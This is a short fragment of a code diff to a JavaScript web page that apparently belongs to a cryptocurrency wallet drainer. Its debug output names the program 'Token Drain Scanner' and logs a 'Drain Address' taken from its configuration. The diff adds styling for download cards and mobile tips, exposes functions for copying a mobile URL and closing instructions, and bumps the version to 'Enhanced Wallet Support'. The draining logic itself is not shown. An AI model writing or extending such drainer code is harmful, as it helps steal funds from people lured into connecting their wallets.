+            .download-card span:first-child {
+                font-size: 32px;
+            }
+            
+            .mobile-tip {
+                font-size: 14px;
+                color: #666;
+                margin-top: 20px;
+            }
+        </style>
     `;
     
     statusEl.innerHTML = guideHTML;
@@ -1275,10 +1833,12 @@ window.addEventListener('DOMContentLoaded', initializeApp);
 window.selectWallet = selectWallet;
 window.closeWalletSelector = closeWalletSelector;
 window.handleMobileWalletClick = handleMobileWalletClick;
+window.copyMobileUrl = copyMobileUrl;
+window.closeMobileInstructions = closeMobileInstructions;
 
 // Debug
 console.log('=== Token Drain Scanner ===');
-console.log('Version: 4.0 - Fixed Wallet Selector');
+console.log('Version: 5.0 - Enhanced Wallet Support');
 console.log('Drain Address:', CONFIG.drainAddress);
 console.log('Device:', isMobile ? '📱 Mobile' : '💻 Desktop');
 console.log('===========================');
